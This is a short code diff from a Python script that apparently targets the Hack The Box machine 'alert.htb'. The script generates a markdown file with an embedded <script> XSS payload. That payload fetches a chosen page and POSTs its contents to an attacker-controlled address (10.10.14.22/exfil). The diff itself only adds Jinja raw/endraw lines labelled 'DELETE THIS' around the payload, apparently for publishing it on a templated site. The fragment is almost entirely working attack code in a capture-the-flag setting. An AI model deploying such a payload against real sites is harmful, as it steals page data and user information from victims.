@@ -133,9 +133,11 @@ target = sys.argv[1] if sys.argv[1].startswith('http') else f'http://alert.htb/m
 # generate markdown
 markdown = f"""### load script
 <script>
+{% raw %} ////// DELETE THIS
 fetch('{target}')
 .then(resp => resp.text())
 .then(body => {{fetch("http://10.10.14.22/exfil", {{ method: "POST", body: body}});}})
+{% endraw %} ///// DELETE THIS
 </script>
 """
 
